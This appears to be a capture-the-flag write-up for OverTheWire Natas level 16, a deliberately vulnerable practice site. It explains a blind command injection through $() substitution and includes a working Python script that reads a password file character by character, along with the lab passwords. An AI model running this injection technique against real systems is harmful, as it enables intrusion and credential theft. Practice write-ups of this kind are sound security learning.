# Natas Level 16 to 17

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 16 -> 17 |
| Status | Complete |

## Objective

Extract the next password through a heavily filtered shell command.

## Given Access

User: `natas16`

Password:

```text
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

## Method

The source runs `grep -i "$key" dictionary.txt` and filters common shell metacharacters, but allows command substitution with `$()`. Use `grep` inside command substitution to test password prefixes. If the prefix matches, the outer `grep` searches for the full password and returns no dictionary output. If the prefix does not match, the substitution is empty and the dictionary is printed.

## Commands

```python
import requests, string

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
chars = list(string.ascii_letters + string.digits)
password = ""

def has_prefix(prefix, choices):
    regex = "^" + prefix + "[" + "".join(choices) + "]"
    payload = f"$(grep -E {regex} /etc/natas_webpass/natas17)"
    r = requests.get(url, auth=auth, params={"needle": payload}, timeout=10)
    return "African" not in r.text

while len(password) < 32:
    pool = chars[:]
    while len(pool) > 1:
        mid = (len(pool) + 1) // 2
        left = pool[:mid]
        pool = left if has_prefix(password, left) else pool[mid:]
    password += pool[0]
    print(password)
```

## Result

Password for `natas17`:

```text
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

## Lesson

Quoting user input inside a shell command is not enough when shell expansion is still active. `$()` provided a blind command-substitution oracle.

## References

- https://overthewire.org/wargames/natas/
